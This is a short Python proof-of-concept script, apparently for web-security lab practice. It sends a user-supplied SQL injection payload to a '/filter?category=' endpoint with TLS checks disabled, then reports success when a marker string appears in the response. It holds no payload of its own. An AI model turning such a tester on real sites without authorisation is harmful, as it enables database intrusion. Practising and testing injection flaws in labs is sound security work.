#THIS SCRIPT IS TO HELP TO MAKE A PROVE OF THE EXPLOIT, NOT FOR EXPLOIT THE WEBAPP AUTOMATICALLY

import requests, sys, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli(url, payload):

    uri = '/filter?category='  #CHANGE THIS FOR THE CATEGORY OF THE TARGET like: uri = '/filter?category=' 
    r = requests.get(url + uri + payload, verify=False)
    if "Eye" in r.text: # CHANGE THIS FOR SOME STRING THAT APPEARS WHEN THE EXPLOIT IS SUCCESSFULLY 
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()


    except IndexError:
        #mostra como usa
        print('[*] Usage: %s <url> <payload>' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, sqli_payload):
        print('[+] SQL Injection successfull !')
    else:
        print('[-] SQL Injection unsuccessfull !')
